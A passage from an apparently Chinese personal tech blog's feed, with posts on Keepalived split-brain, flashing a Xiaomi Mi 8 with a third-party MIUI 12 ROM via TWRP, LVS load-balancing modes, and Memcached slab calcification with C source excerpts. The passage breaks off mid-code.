title="4.1、背景"></a>4.1、背景</h3><p>在<code>双机热备</code>高可用（HA）系统中，当两个节点断开联系时，本来为一个整体、动作协调的HA系统就会分裂成为两个独立的节点。由于节点之间失去通信，它们都以为是对方出了故障，因此两个节点上的HA就会像脑裂了一样，本能地争取”应用服务”，可能导致如下两种情况：</p><ul><li>共享资源被不断的争夺，导致服务不可用；</li><li>共享资源备同时获取，导致最终的数据出错；</li></ul><p>由于Keepalived中的主备两台机器所处的状态与对方的状态有关，如果两台机器之间的网络出现了问题，就会出现脑裂的情况，这时网络中就会由于资源竞争导致<code>双主</code>或者<code>无主</code>的情况，从而进行服务。</p><h3 id="4-2、解决方案"><a href="#4-2、解决方案" class="headerlink" title="4.2、解决方案"></a>4.2、解决方案</h3><p>针对于脑裂的问题，通常大概有四种可行的思路：</p><ul><li><code>Quorums(法定人数)</code>：通过设置法定人数, 进而确定集群的容忍度, 当集群中存活的节点少于法定人数, 集群将不可用。通常存活的节点数必须过半，以便能够选取出集群的Leader，ZooKeeper默认就是利用该策略进行防止脑裂以及进行Leader选举；</li><li><code>第三方仲裁</code>：当多个节点出现冲突的情况，可以由第三方仲裁来决定谁是Leader，Keepalived可以使用这个方案来解决；</li><li><code>Redundant Communications(冗余通信)</code>：集群中采用多种通信方式，防止一种通信方式失效导致集群中的节点无法通信；</li><li><code>Fencing(共享资源)</code>：能看到共享资源就表示在集群中，能够获得共享资源的锁的就是Leader，这种方式在某些情况下可能导致死锁；</li></ul><p>可在Keepalived的机器上配置相关的检测任务，通过检测本机与网关的通畅性来<code>起停</code>本地的Keepalived服务，进而保证在出现节点网络异常的情况下能够杀掉本机的Keepalived来避免脑裂情况的出现。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Keepalived </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小米8刷入MIUI12国外版</title>
      <link href="/2020/06/13/mi8-miui12-eu-rom/"/>
      <url>/2020/06/13/mi8-miui12-eu-rom/</url>
      
        <content type="html"><![CDATA[<h2 id="一、MIUI相关版本"><a href="#一、MIUI相关版本" class="headerlink" title="一、MIUI相关版本"></a>一、MIUI相关版本</h2><ul><li><a href="https://www.miui.com/download.html">国内版本</a>：MIUI的官方国内版本，功能比较齐全，国内的服务套件比较齐全（小爱同学等），但是广告比较多，并且预装应用以及后台常驻的系统组件比较多，缺少Google套件（可以通过其他方式安装，但是会有稳定性以及兼容问题）；</li><li><a href="https://c.mi.com/global/miuidownload/index">国际版</a>：MIUI的官方的国际版本（也被称为俄罗斯版本），自带过多的Google套件，比较臃肿，没有广告；不自带小米钱包，因此无法原生使用小米公交等服务（后续可刷入）；</li><li><a href="https://miuipolska.pl/download/">波兰版本</a>：MIUI的第三方定制的ROM，自带Google套件，没有广告；不自带小米钱包，因此无法原生使用小米公交等服务（后续可刷入）；</li><li><a href="https://xiaomi.eu/community/">英国版本</a>：MIUI的第三方定制的ROM，自带Google套件，没有广告；不自带小米钱包，因此无法原生使用小米公交等服务（后续可刷入）；</li></ul><h2 id="二、刷机教程"><a href="#二、刷机教程" class="headerlink" title="二、刷机教程"></a>二、刷机教程</h2><p>针对于<a href="https://www.miui.com/download.html">国内版本</a>和<a href="https://c.mi.com/global/miuidownload/index">国际版</a>，我们可是使用小米官方提供的刷机方式进行刷机即可，<a href="http://www.miui.com/shuaji-329.html">官方教程</a>。针对于第三方地址的ROM，可以按照如下方式进行刷机。接下来我们将对小米8进行刷机，ROM为英国版本MIUI12。</p><h3 id="2-1、解锁Bootloader"><a href="#2-1、解锁Bootloader" class="headerlink" title="2.1、解锁Bootloader"></a>2.1、解锁Bootloader</h3><p>关于Bootloader的详细介绍可以查看<a href="https://baike.baidu.com/item/Boot%20Loader">百度百科 - Bootloader</a>，简而言之就是手机厂商为了防止用户刷入第三方ROM导致系统出现不可逆的损坏，同时也为了保护手机底层以及用户的一些敏感信息。目前小米全线的手机都对Bootloader进行了加锁，我们可以使用小米官方提供的解锁方式进行解锁：<a href="http://www.miui.com/unlock/index.html">解锁小米手机</a></p><h3 id="2-2、安装TWRP"><a href="#2-2、安装TWRP" class="headerlink" title="2.2、安装TWRP"></a>2.2、安装TWRP</h3><p><a href="https://zh.wikipedia.org/wiki/TWRP">TWRP</a>，全称是<code>Team Win Recovery Project</code>是一款知名的第三方的Recovery工具，关于Recovery的介绍可以参考<a href="https://baike.baidu.com/item/Recovery/9995978">百度百科 - Recovery</a>，在进行第三方ROM的刷机之前我们需要给系统刷入TWRP，我们可以在<a href="https://twrp.me/">TWRP的官网</a>找到对应手机版本的TWRP进行刷入，具体步骤如下：</p><ul><li>在TWRP支持的设备列表选择手机厂商型号：<a href="https://twrp.me/Devices/">https://twrp.me/Devices/</a> ；</li><li>选择对应手机型号的最新版本的TWRP进行下载即可，截止到测试时最新版本为<code>3.3.1-2</code>；</li><li>备份手机中的重要数据，刷机过程中需要清除手机数据；</li><li>手机进入fastboot模式（小米8在关机后长按电源键+音量下键即可进入）连接电脑，使用以下指令验证手机设备使用正常识别并且进行刷入操作：<ul><li><code>adb devices</code>：如果获取到手机设备序列号即代表当前电脑已经识别手机并连接成功；</li><li><code>fastboot flash recovery twrp-x.x.x-x-polaris.img</code>：将下载好的TWRP刷入手机，之后后通过提示信息可判断是否刷入成功；</li><li><code>fastboot oem reboot-recovery</code>：重启手机并进入<code>TWRP Recovery</code>模式；</li></ul></li></ul><h3 id="2-3、下载ROM包并刷机"><a href="#2-3、下载ROM包并刷机" class="headerlink" title="2.3、下载ROM包并刷机"></a>2.3、下载ROM包并刷机</h3><ul><li>由于我们计划刷入的ROM为<code>MIUI12英国版</code>，因此在<a href="https://xiaomi.eu/community/">英国版本</a>网站中下载指定的版本，我们使用的版本为<code>MIUI12的20.6.11</code>；</li><li>将下载好的ROM包存入手机；</li><li>进入手机的<code>TWRP Recovery</code>模式，小米8可通过以下方式进入：同时按电源键+音量上键，在手机震动出现小米Logo后松开电源键，不松开音量上键等待进入；</li><li>在<code>TWRP Recovery</code>模式中选择安装对应的ROM包即可；</li><li>由于使用的是非国内版的ROM包，安装完成后进入系统启动配置时可能需要能够访问外网的网络环境；</li></ul><h3 id="2-4、刷入小米钱包"><a href="#2-4、刷入小米钱包" class="headerlink" title="2.4、刷入小米钱包"></a>2.4、刷入小米钱包</h3><p>小米8本身支持全功能NFC，但是由于国外版本的ROM没有内置小米钱包，刷机之后无法使用小米公交卡等NFC服务，因此需要手动刷入小米钱包。</p><h4 id="2-4-1、下载国内版本对应ROM"><a href="#2-4-1、下载国内版本对应ROM" class="headerlink" title="2.4.1、下载国内版本对应ROM"></a>2.4.1、下载国内版本对应ROM</h4><p>我们需要首先从国内版本的ROM中提取出小米钱包，因此之前需要下载与国外版相同版本ROM的国内ROM，但是由于<code>MIUI12</code>的<code>20.6.11</code>版本刚刚释出，并且<code>MIUI12</code>在国内处于预约测试状态，只能通过之前预约的在手机端进行更新下载，我们暂时没有找到<code>20.6.11</code>版本的国内的ROM的下载方式，不过我们仍旧可以通过较低版本的<code>MIUI12</code>的ROM包进行提取操作，网友给出了<code>MIUI12</code>的较低版本的部分机型的下载地址：<a href="https://news.mydrivers.com/1/686/686222.htm">https://news.mydrivers.com/1/686/686222.htm</a></p><h4 id="2-4-2、提取小米钱包"><a href="#2-4-2、提取小米钱包" class="headerlink" title="2.4.2、提取小米钱包"></a>2.4.2、提取小米钱包</h4><ul><li>下载提取工具<code>mipay-extract</code>：<a href="https://github.com/linusyang92/mipay-extract%EF%BC%9B">https://github.com/linusyang92/mipay-extract；</a></li><li>将下载的国内版的ROM放入<code>mipay-extract</code>文件夹目录中，并运行同目录下的<code>extract.bat</code>（Windows环境下）；</li><li>将提取出来的<code>mipay-*-*.zip</code>拷入手机根目录中；</li></ul><h4 id="2-4-3、刷入小米钱包"><a href="#2-4-3、刷入小米钱包" class="headerlink" title="2.4.3、刷入小米钱包"></a>2.4.3、刷入小米钱包</h4><ul><li>重启进入<code>TWRP Recovery</code>模式，选择<code>挂载</code>，并选中<code>System</code>，然后返回点击<code>安装</code>，选择对应的<code>mipay-*-*.zip</code>进行卡刷即可；</li><li>刷入成功后进入手机系统后，会发现系统中多了一个<code>小米钱包</code>的软件，然后进入<code>设置</code>，将系统中的NFC相关设置的<code>安全模块位置</code>修改为<code>内置安全模块</code>；</li><li>后续即可正常使用NFC用于公交，NFC卡片复制等；</li></ul><h2 id="三、参考网址"><a href="#三、参考网址" class="headerlink" title="三、参考网址"></a>三、参考网址</h2><ul><li><a href="http://www.midousir.com/2019/05/xiaomi8-pro-recovery/">http://www.midousir.com/2019/05/xiaomi8-pro-recovery/</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> MIUI </tag>
            
            <tag> 刷机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LVS的四种工作模式</title>
      <link href="/2020/06/10/lvs-4-models/"/>
      <url>/2020/06/10/lvs-4-models/</url>
      
        <content type="html"><![CDATA[<h2 id="一、DR模式"><a href="#一、DR模式" class="headerlink" title="一、DR模式"></a>一、DR模式</h2><p><img src="/assets/images/lvs-dr.png" alt="LVS-DR" loading="lazy"></p><h3 id="1-1、原理"><a href="#1-1、原理" class="headerlink" title="1.1、原理"></a>1.1、原理</h3><ul><li>客户端将访问VIP报文发送给<code>LVS</code>；</li><li>LVS将客户端请求报文的MAC地址改为后端真实服务器的MAC地址；</li><li>后端真实服务器得到访问报文后进行IP查看，在确认自己有对应的VIP之后进行请求处理；</li><li>后端真实服务器在处理完数据请求后，直接响应客户端；</li></ul><p><strong>数据包流转过程：</strong></p><p><img src="/assets/images/lvs-dr-process.png" alt="LVS-DR-Process" loading="lazy"></p><h3 id="1-2、特点"><a href="#1-2、特点" class="headerlink" title="1.2、特点"></a>1.2、特点</h3><ul><li>工作在数据链路层（OSI网络模型中的第二层），需要由LVS修改客户端请求的二层数据包的目标MAC地址；</li><li>LVS和后端真实的服务器需要处在一个广播域（VLan）中；</li><li>LVS和后端真实的服务器上都需要配置VIP，并且后端真实的服务不应该响应网络中对于该VIP的ARP请求；</li></ul><h3 id="1-3、优缺点"><a href="#1-3、优缺点" class="headerlink" title="1.3、优缺点"></a>1.3、优缺点</h3><ul><li><strong>优点：</strong><ul><li><code>LVS</code>只是修改了<code>MAC地址</code>，所以非常快速，并且<code>LVS</code>不会成为瓶颈；</li><li>不需要使用隧道结构，绝大多数操作系统都可以用于服务；</li></ul></li><li><strong>缺点：</strong><ul><li><code>LVS</code>必须和后端真实服务器处于同一<code>VLan</code>中；</li><li>后端真实服务器直接响应客户端，对于后端真实服务器来说，并不安全；</li></ul></li></ul><h3 id="1-4、软件应用"><a href="#1-4、软件应用" class="headerlink" title="1.4、软件应用"></a>1.4、软件应用</h3><ul><li>待补充；</li></ul><h2 id="二、TUNNEL模式"><a href="#二、TUNNEL模式" class="headerlink" title="二、TUNNEL模式"></a>二、TUNNEL模式</h2><p><img src="/assets/images/lvs-tunnel.png" alt="LVS-TUNNEL" loading="lazy"></p><h3 id="2-1、原理"><a href="#2-1、原理" class="headerlink" title="2.1、原理"></a>2.1、原理</h3><ul><li>客户端将访问<code>VIP报文</code>发送给<code>LVS</code>；</li><li>LVS收到豹纹后，发现请求的IP是在规则里面存在的地址，那么它将在客户端请求报文的首部再封装一层 IP 报文,将源地址改为LVS机器的IP，目标地址改为后端真实的服务器IP ,并将此包发送给对应的后端真实的服务器；</li><li>后端真实服务器将请求报文后，会首先拆开第一层封装,然后发现里面还有一层 IP 首部的目标地址是自己 lo 接口上的 <code>VIP</code> ，所以会处理次请求报文；</li><li>后端真实服务器在处理完数据请求后，直接响应客户端；</li></ul><h3 id="2-2、特点"><a href="#2-2、特点" class="headerlink" title="2.2、特点"></a>2.2、特点</h3><ul><li>工作在网络层（OSI网络模型中的第三层），需要由<code>LVS</code>进行二次封装报文；</li><li><code>LVS</code>和后端真实服务器上都要有<code>VIP</code>；</li><li>由于会存在二次报文封装，所以请求的报文不能太大；</li></ul><h3 id="2-3、优缺点"><a href="#2-3、优缺点" class="headerlink" title="2.3、优缺点"></a>2.3、优缺点</h3><ul><li><strong>优点：</strong><ul><li>可处理巨大的请求量；</li></ul></li><li><strong>缺点：</strong><ul><li>服务器需要支持<code>IP Tunneling</code>协议；</li></ul></li></ul><h3 id="2-4、软件应用"><a href="#2-4、软件应用" class="headerlink" title="2.4、软件应用"></a>2.4、软件应用</h3><ul><li>待补充；</li></ul><h2 id="三、NAT模式"><a href="#三、NAT模式" class="headerlink" title="三、NAT模式"></a>三、NAT模式</h2><p><img src="/assets/images/lvs-nat.png" alt="LVS-NAT" loading="lazy"></p><h3 id="3-1、原理"><a href="#3-1、原理" class="headerlink" title="3.1、原理"></a>3.1、原理</h3><ul><li>客户端将访问<code>VIP报文</code>发送给<code>LVS</code>；</li><li>当用户请求到达 <code>DirectorServer</code> ，此时请求的数据报文会先到内核空间的 <code>PREROUTING链</code>， 此时报文的<code>源IP</code> 为 <code>CIP</code>，<code>目标IP</code>为 <code>VIP</code> ；</li><li><code>PREROUTING</code> 检查发现数据包的<code>目标IP</code> 是本机，将数据包送至<code>INPUT链</code>；</li><li><code>IPVS</code> 比对数据包请求的服务是否为集群服务，若是，修改数据包的<code>目标IP</code> 地址为 <code>后端服务器IP</code>，然后将数据包发至 <code>POSTROUTING 链</code>， 此时报文的 <code>源IP</code> 为 <code>CIP</code>，<code>目标IP</code> 为 <code>RIP</code> ，在这个过程完成了 <code>目标IP</code> 的转换；</li><li><code>POSTROUTING链</code> 通过选路，将数据包发送给 <code>Real Server</code>；</li><li><code>Real Server</code> 比对发现目标为<code>自己的IP</code>，开始构建响应报文发回给 <code>Director Server</code>。 此时报文的<code>源IP</code> 为 <code>RIP</code>，<code>目标IP</code> 为 <code>CIP</code> ；</li><li><code>Director Server</code> 在响应客户端前，此时会将 <code>源IP</code> 地址修改为 <code>自己的VIP地址</code>，然后响应给客户端。 此时报文的 <code>源IP</code> 为 <code>VIP</code>，<code>目标IP</code> 为 <code>CIP</code>；</li></ul><h3 id="3-2、特点"><a href="#3-2、特点" class="headerlink" title="3.2、特点"></a>3.2、特点</h3><ul><li>LVS服务器需要有不同的网段；</li><li>真实服务器的网关必须设置为LVS的ip地址；</li></ul><h3 id="3-3、优缺点"><a href="#3-3、优缺点" class="headerlink" title="3.3、优缺点"></a>3.3、优缺点</h3><ul><li><strong>优点：</strong><ul><li>节省IP地址；</li><li>能够对内部的请求链路进行伪装；</li></ul></li><li><strong>缺点：</strong><ul><li>由于返回给请求方的数据需要经过调度器，因此执行效率较低；</li></ul></li></ul><h3 id="3-4、软件应用"><a href="#3-4、软件应用" class="headerlink" title="3.4、软件应用"></a>3.4、软件应用</h3><ul><li>待补充；</li></ul><h2 id="四、FULLNAT模式"><a href="#四、FULLNAT模式" class="headerlink" title="四、FULLNAT模式"></a>四、FULLNAT模式</h2><p><img src="/assets/images/lvs-fullnat.png" alt="LVS-FULLNAT" loading="lazy"></p><h3 id="4-1、原理"><a href="#4-1、原理" class="headerlink" title="4.1、原理"></a>4.1、原理</h3><ul><li>客户端将访问<code>VIP报文</code>发送给<code>LVS</code>；</li><li><code>Director</code> 接过请求，发现是请求后端的集群服务；</li><li><code>Director</code> 对请求进行 <code>FULL NAT</code>，把<code>源IP</code>修改为<code>DIP</code>，把<code>目标IP</code>修改为任意<code>后端RS</code>的<code>RIP</code>，然后发送给后端；</li><li><code>RS</code>收到请求后进行处理并响应，响应报文的<code>源IP</code>为<code>RIP</code>，<code>目标IP</code>还是<code>DIP</code>，经过内部路由，将响应报文回复给 <code>Director</code>；</li><li><code>Director</code> 接受到响应报文后，进行 <code>FULL NAT</code>，把<code>源IP</code>修改为<code>VIP</code>，<code>目标IP</code>修改为<code>CIP</code>；</li></ul><h3 id="4-2、特点"><a href="#4-2、特点" class="headerlink" title="4.2、特点"></a>4.2、特点</h3><ul><li><code>RIP</code>，<code>DIP</code>可以使用私有地址；</li><li><code>RIP</code>和<code>DIP</code>可以不再同一个网络中，且<code>RIP</code>的网关未必需要指向<code>DIP</code>；</li><li>支持端口映射；</li><li><code>RS</code> 的操作系统可以使用任意类型；</li><li>请求报文经由 <code>Director</code>，响应报文也经由 <code>Director</code>；</li><li>抗攻击，可跨 <code>VLAN</code>，需要重新编译内核；</li></ul><h3 id="4-3、优缺点"><a href="#4-3、优缺点" class="headerlink" title="4.3、优缺点"></a>4.3、优缺点</h3><ul><li><strong>优点：</strong><ul><li>解决了跨<code>VLAN</code>的问题；</li><li><code>LVS</code>和<code>RS</code>的部署在<code>VLAN</code>上将不再有任何限制，大大提高了运维部署的便利性；</li></ul></li><li><strong>缺点：</strong><ul><li>需要做4次地址转换；</li></ul></li></ul><h3 id="4-4、软件应用"><a href="#4-4、软件应用" class="headerlink" title="4.4、软件应用"></a>4.4、软件应用</h3><ul><li>待补充；</li></ul><h2 id="五、相关网址"><a href="#五、相关网址" class="headerlink" title="五、相关网址"></a>五、相关网址</h2><ul><li><a href="http://www.linuxvirtualserver.org/">Linux Virtual Server</a></li><li><a href="http://element-ui.cn/news/show-337453.aspx">负载均衡集群——LVS之四种模式</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> LVS </tag>
            
            <tag> 负载均衡 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Memcached的钙化及相关解决方案</title>
      <link href="/2020/05/24/memcached-slab-calcification/"/>
      <url>/2020/05/24/memcached-slab-calcification/</url>
      
        <content type="html"><![CDATA[<h2 id="一、背景"><a href="#一、背景" class="headerlink" title="一、背景"></a>一、背景</h2><p>由于Memcached存储数据的时候是按照Slabs分类进行存储的，当内存达到Memcached限制的时候，服务进程会执行一系列的内存回收方案，但是，不管是什么内存回收方案，回收的大前提就只有一种：<strong>只回收与即将写入数据写入数据块一致的Slabs</strong>。因此，这就导致了在业务访问模型变更之后，Memcached对于之前访问模型存储的数据就不会做任何变更，也就是说那部分数据永不会被剔除，因此最终服务可用的内存也会远小于进程启动时的设定，这种情况就被称为Memcached的Slab钙化现象（Slab Calcification）。</p><p>在Memcached的 <a href="https://github.com/memcached/memcached/wiki/ReleaseNotes1411">1.4.11</a> 版本之前，官方版本一直存在内存钙化的问题，在这个过程中，Twitter基于Memcached 1.4.4的版本推出了 <a href="https://github.com/twitter/twemcache">Twemcache</a> 尝试解决了Slab钙化的问题。在1.4.11版本中，官方引入了 Slab 的 <code>Automove &amp; Rebalance</code> 的策略也解决了内存钙化的问题。</p><h2 id="二、-Automove-Rebalance-策略"><a href="#二、-Automove-Rebalance-策略" class="headerlink" title="二、 Automove &amp; Rebalance 策略"></a>二、 Automove &amp; Rebalance 策略</h2><h3 id="2-1、概念简介"><a href="#2-1、概念简介" class="headerlink" title="2.1、概念简介"></a>2.1、概念简介</h3><p>通过检测每个<code>Slab Classes</code>的内存使用情况，判断哪些需要使用更多的内存，从而将其他的<code>Slab Classes</code>中的数据清除，将得到的内存空间分配给需要的<code>Slab Classes</code>。</p><h3 id="2-2-算法逻辑"><a href="#2-2-算法逻辑" class="headerlink" title="2.2 算法逻辑"></a>2.2 算法逻辑</h3><p><strong>具体算法实现以最新版本的Memcached进行讲解（版本：1.6.6）</strong>，在这个版本中，automove的实现逻辑在主线程中，并不是使用一个单独的线程（<code>1.4.14</code>到<code>1.4.24</code>版本中的实现逻辑为一个单独的线程，关于这个区间版本中<code>automove</code>的具体实现逻辑，可以参考<a href="https://blog.csdn.net/luotuo44/article/details/43015129">这里</a>）。</p><h4 id="2-2-1、Automove执行逻辑"><a href="#2-2-1、Automove执行逻辑" class="headerlink" title="2.2.1、Automove执行逻辑"></a>2.2.1、Automove执行逻辑</h4><p>每次内存分配前都会判断当前内存是否富余，在内存不够的情况下会执行<code>memory_release</code>函数（该函数依旧受限于<code>settings.slab_reassign</code>参数）进行相关的内存释放。</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Must only be used if all pages are item_size_max */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">memory_release</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">void</span> *p = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">if</span> (mem_base != <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span>;<br><br>    <span class="hljs-keyword">if</span> (!settings.slab_reassign)<br>        <span class="hljs-keyword">return</span>;<br><br>    <span class="hljs-comment">/* 内存不够的情况下,选取一个page进行内存释放 */</span><br>    <span class="hljs-keyword">while</span> (mem_malloced &gt; mem_limit &amp;&amp;<br>            (p = get_page_from_global_pool()) != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">free</span>(p);<br>        mem_malloced -= settings.slab_page_size;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>选取page的逻辑如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Fast FIFO queue */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">get_page_from_global_pool</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    <span class="hljs-type">slabclass_t</span> *p = &amp;slabclass[SLAB_GLOBAL_PAGE_POOL];<br>    <span class="hljs-keyword">if</span> (p-&gt;slabs &lt; <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* <span class="hljs-doctag">TODO:</span> 这里的含义是？为什么取最后一个？ */</span><br>    <span class="hljs-type">char</span> *ret = p-&gt;slab_list[p-&gt;slabs - <span class="hljs-number">1</span>];<br>    p-&gt;slabs--;<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="2-2-2、Rebalance执行逻辑"><a href="#2-2-2、Rebalance执行逻辑" class="headerlink" title="2.2.2、Rebalance执行逻辑"></a>2.2.2、Rebalance执行逻辑</h4><p>线程启动入口为<code>start_slab_maintenance_thread</code>函数（是否启用受限制于<code>settings.slab_reassign</code>启动参数，该参数在<code>1.5.0</code>之前的版本中默认为<code>false</code>，在<code>1.5.0</code>及之后的版本默认为<code>true</code>）</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">start_slab_maintenance_thread</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    <span class="hljs-type">int</span> ret;<br>    slab_rebalance_signal = <span class="hljs-number">0</span>;<br>    slab_rebal.slab_start = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-keyword">if</span> ((ret = pthread_create(&amp;rebalance_tid, <span class="hljs-literal">NULL</span>,<br>                              slab_rebalance_thread, <span class="hljs-literal">NULL</span>)) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Can&#x27;t create rebal thread: %s\n&quot;</span>, strerror(ret));<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在未执行实际的slab class重分配之前的逻辑：</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Slab mover thread.</span><br><span class="hljs-comment"> * Sits waiting for a condition to jump off and shovel some memory about</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">slab_rebalance_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span> &#123;<br>    <span class="hljs-type">int</span> was_busy = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> backoff_timer = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> backoff_max = <span class="hljs-number">1000</span>;<br>    <span class="hljs-comment">/* So we first pass into cond_wait with the mutex held */</span><br>    mutex_lock(&amp;slabs_rebalance_lock);<br><br>    <span class="hljs-comment">/* Must finish moving page before stopping */</span><br>    <span class="hljs-comment">// 初始状态：slab_rebalance_signal = 0, do_run_slab_rebalance_thread = 1</span><br>    <span class="hljs-keyword">while</span> (slab_rebalance_signal || do_run_slab_rebalance_thread) &#123;<br>        <span class="hljs-keyword">if</span> (slab_rebalance_signal == <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">if</span> (slab_rebalance_start() &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-comment">/* Handle errors with more specificity as required. */</span><br>                slab_rebalance_signal = <span class="hljs-number">0</span>;<br>            &#125;<br><br>            was_busy = <span class="hljs-number">0</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (slab_rebalance_signal &amp;&amp; slab_rebal.slab_start != <span class="hljs-literal">NULL</span>) &#123;<br>            was_busy = slab_rebalance_move();<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (slab_rebal.done) &#123;<br>            slab_rebalance_finish();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (was_busy) &#123;<br>            <span class="hljs-comment">/* Stuck waiting for some items to unlock, so slow down a bit</span><br><span class="hljs-comment">             * to give them a chance to free up */</span><br>            usleep(backoff_timer);<br>            backoff_timer = backoff_timer * <span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">if</span> (backoff_timer &gt; backoff_max)<br>                backoff_timer = backoff_max;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (slab_rebalance_signal == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-comment">/* always hold this lock while we&#x27;re running */</span><br>            pthread_cond_wait(&amp;slab_rebalance_cond, &amp;slabs_rebalance_lock);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> cancel in-flight slab page move</span><br>    mutex_unlock(&amp;slabs_rebalance_lock);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Rebalance的触发来源：</strong></p><ul><li><strong>手动执行指令</strong>：<code>slabs reassign src dest</code>(<code>1.4.11</code>版本后支持)；</li><li><strong>lru相关的线程</strong>；</li></ul><p>在执行实际的Rebalance之前，需要获悉待清理的来源slab class，和需要给哪一个slab class分配内存：</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">enum</span> reassign_result_type <span class="hljs-title function_">do_slabs_reassign</span><span class="hljs-params">(<span class="hljs-type">int</span> src, <span class="hljs-type">int</span> dst)</span> &#123;<br>    <span class="hljs-type">bool</span> nospare = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">if</span> (slab_rebalance_signal != <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> REASSIGN_RUNNING;<br><br>    <span class="hljs-comment">/* 移动的src和dst不能相同 */</span><br>    <span class="hljs-keyword">if</span> (src == dst)<br>        <span class="hljs-keyword">return</span> REASSIGN_SRC_DST_SAME;<br><br>    <span class="hljs-comment">/* 随机选取一个原slab class并将其移动到dst，src不能与dst相同，</span><br><span class="hljs-comment">     * 注意: 1.4.14及之后的版本开始支持任意来源的形式，即&#x27;slabs reassign -1 15&#x27; </span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-keyword">if</span> (src == <span class="hljs-number">-1</span>) &#123;<br>        src = slabs_reassign_pick_any(dst);<br>        <span class="hljs-comment">/* <span class="hljs-doctag">TODO:</span> If we end up back at -1, return a new error type */</span><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (src &lt; SLAB_GLOBAL_PAGE_POOL || src &gt; power_largest ||<br>        dst &lt; SLAB_GLOBAL_PAGE_POOL || dst &gt; power_largest)<br>        <span class="hljs-keyword">return</span> REASSIGN_BADCLASS;<br><br>    pthread_mutex_lock(&amp;slabs_lock);<br>    <span class="hljs-comment">/* 原slab class没有或者只有一个slab则不能分配给别的slab class */</span><br>    <span class="hljs-keyword">if</span> (slabclass[src].slabs &lt; <span class="hljs-number">2</span>)<br>        nospare = <span class="hljs-literal">true</span>;<br>    pthread_mutex_unlock(&amp;slabs_lock);<br>    <span class="hljs-keyword">if</span> (nospare)<br>        <span class="hljs-keyword">return</span> REASSIGN_NOSPARE;<br><br>    slab_rebal.s_clsid = src;<br>    slab_rebal.d_clsid = dst;<br><br>    slab_rebalance_signal = <span class="hljs-number">1</span>;<br>    pthread_cond_signal(&amp;slab_rebalance_cond);<br><br>    <span class="hljs-keyword">return</span> REASSIGN_OK;<br>&#125;<br></code></pre></td></tr></table></figure><p>具体执行slab class重分配的相关函数为<code>slab_rebalance_thread</code>：</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* refcount == 0 is safe since nobody can incr while item_lock is held.</span><br><span class="hljs-comment"> * refcount != 0 is impossible since flags/etc can be modified in other</span><br><span class="hljs-comment"> * threads. instead, note we found a busy one and bail. logic in do_item_get</span><br><span class="hljs-comment"> * will prevent busy items from continuing to be busy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">NOTE:</span> This is checking it_flags outside of an item lock. I believe this</span><br><span class="hljs-comment"> * works since it_flags is 8 bits, and we&#x27;re only ever comparing a single bit</span><br><span class="hljs-comment"> * regardless. ITEM_SLABBED bit will always be correct since we&#x27;re holding the</span><br><span class="hljs-comment"> * lock which modifies that bit. ITEM_LINKED won&#x27;t exist if we&#x27;re between an</span><br><span class="hljs-comment"> * item having ITEM_SLABBED removed, and the key hasn&#x27;t been added to the item</span><br><span class="hljs-comment"> * yet. The memory barrier from the slabs lock should order the key write and the</span><br><span class="hljs-comment"> * flags to the item?</span><br><span 